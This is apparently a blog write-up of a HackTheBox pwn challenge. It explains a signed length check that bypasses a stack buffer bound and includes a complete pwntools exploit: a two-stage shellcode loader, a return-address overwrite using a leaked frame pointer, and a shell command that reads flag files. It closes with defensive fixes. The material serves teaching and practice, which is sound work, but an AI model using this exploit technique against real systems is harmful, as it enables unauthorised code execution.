---
title: "Optimistic"
date: 2027-05-31 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, binary-exploitation, integer-overflow, buffer-overflow, shellcode, pwntools, aslr]
description: "An Easy Pwn challenge: a 'positivity sign-up' binary checks your name length with a signed comparison but uses it as an unsigned read() count — so a negative length wraps to a huge read and overflows the stack. With a leaked stack pointer, an unchecked input tail, and an executable stack, a tiny two-stage shellcode loader drops a shell."
---

## Overview

Optimistic is an Easy Pwn challenge built around one elegant mistake: the program validates a length with a **signed** comparison, then hands that same value to `read()` as an **unsigned** size. Send `-1`, sail past the `<= 64` guard, and the read becomes effectively unbounded — a textbook [signed-to-unsigned conversion error](https://cwe.mitre.org/data/definitions/195.html) feeding a [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html). The binary also hands us a stack-address leak and runs on an executable stack, so the path from overflow to shell is short.

## The technique

`checksec` on the binary is the whole strategy in one screen: PIE on, **no stack canary**, and crucially **no NX** (`GNU_STACK` is absent, so the stack is mapped **RWX**). Reversing `main()` shows the flow:

1. It prints a "welcome gift": `printf("...gift: %p\n", rbp)` — it literally leaks **its own saved frame pointer**, a live stack address that defeats ASLR/PIE for the stack.
2. It reads an **Email** (8 bytes) and an **Age** (8 bytes) into two stack slots, with no character checks.
3. It reads a name **length** with `scanf("%d", ...)` and checks it with a **signed** compare (`cmp eax, 0x40 ; jle`). `-1 <= 64` is true, so a negative length passes.
4. It calls `read(0, buf, len)` — and `read`'s third argument is an **unsigned** `size_t`, so `-1` becomes `0xFFFFFFFF`. The "≤ 64-byte" name is now an unbounded overflow.
5. A validation loop then rejects the name unless every byte in `name[0 .. bytesRead-9]` is a letter or digit. The **last 9 bytes are never checked** — and 8 of them are exactly the saved return address.

Three independent gifts: a leak to beat PIE, an unchecked tail to write a raw pointer over RIP, and an executable stack to run shellcode directly.

## Solution

The return address sits **104 bytes** above the name buffer, and the buffer must stay alphanumeric for those 104 bytes — so we can't put raw shellcode *there*. The trick is that the **Email and Age fields are unvalidated and contiguous (16 bytes)** — plenty for a tiny non-alphanumeric *loader*. We point RIP at that loader; it `read()`s a full `execve("/bin/sh")` payload onto the RWX stack and jumps into it.

Two coalescing traps cost real time and are worth calling out: the giant `read()` grabs everything waiting in the socket in one syscall, so (a) if follow-up bytes ride along with the name, `bytesRead` grows and the alphanumeric loop suddenly covers the non-alnum return address → the program just `exit()`s; sync on the program's final `"in touch soon."` line first. And (b) an interactive `/bin/sh` loses its first command to the loader's `read()` the same way and dies on EOF — so stage-1 bakes the command into `execve("/bin/sh","-c",CMD)` and needs no interactive stdin.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys
from pwn import *

context.binary = elf = ELF("optimistic", checksec=False)

# Stage-0: read(0, rsp, 0x1000); jmp rsp  -> exactly 16 bytes (fits Email+Age)
stage0 = asm('xor eax,eax; xor edi,edi; mov rsi,rsp; mov edx,0x1000; syscall; jmp rsi')
assert len(stage0) == 16

# Stage-1: self-contained execve("/bin/sh","-c",CMD) -> no interactive stdin needed
CMD = "id; cat flag* /flag* /home/*/flag* 2>/dev/null"
stage1 = asm(shellcraft.amd64.linux.execve("/bin/sh", ["/bin/sh", "-c", CMD], 0))

p = remote(sys.argv[1], int(sys.argv[2]))

p.sendafter(b"(y/n): ", b"y\n")
p.recvuntil(b"gift: ")
rbp = int(p.recvline().strip(), 16)          # leaked saved rbp

p.sendafter(b"Email: ", stage0[:8])           # loader, low half (unvalidated)
p.sendafter(b"Age: ",   stage0[8:16])         # loader, high half (unvalidated)
p.sendafter(b"name: ",  b"-1\n")              # signed-check bypass -> huge read()
p.sendafter(b"Name: ",  b"A"*104 + p64(rbp - 0x70))  # filler + ret -> loader

p.recvuntil(b"in touch soon.")                # SYNC: the name read() is done
p.send(stage1)                                 # loader read()s this, then jmps in
print(p.recvall(timeout=8).decode(errors="replace"))
```

Run it against the instance:

```bash
python3 solve.py <target-ip> <target-port>
```

```
[+] leaked saved rbp = 0x7ffd776640c0
uid=0(root) gid=0(root) groups=0(root)
HTB{...}
```

Flag value redacted.

## Why it worked

The bug hides behind a check that *looks* correct. A reviewer reads `if (len <= 64)` and moves on, never noticing that `len` is signed while `read()`'s count is unsigned — so a negative value is simultaneously "small" (passes the guard) and "enormous" (as a `size_t`). The leaked `rbp` removed the only remaining obstacle (PIE), the unchecked 9-byte tail of the validation loop gave a clean window to overwrite RIP, and the RWX stack meant no ROP was even necessary.

## Fix / defense

Each defect has a one-line fix, and any one of them breaks the chain:

- **Treat lengths as unsigned and bound both ends:** `if ((size_t)len > sizeof(buf)) reject;` — never feed a signed value straight into a `read()`/`memcpy` count.
- **Compile with `-fstack-protector-strong`** so the overwrite trips a canary, and **link `-z noexecstack`** (the modern default) so injected stack bytes can't execute.
- **Validate the entire input**, not `buffer[0 .. n-k]` — an unchecked tail is an arbitrary-write window.
- **Don't leak pointers** (`printf` with an attacker-visible `%p`) that hand the attacker ASLR-defeating addresses.
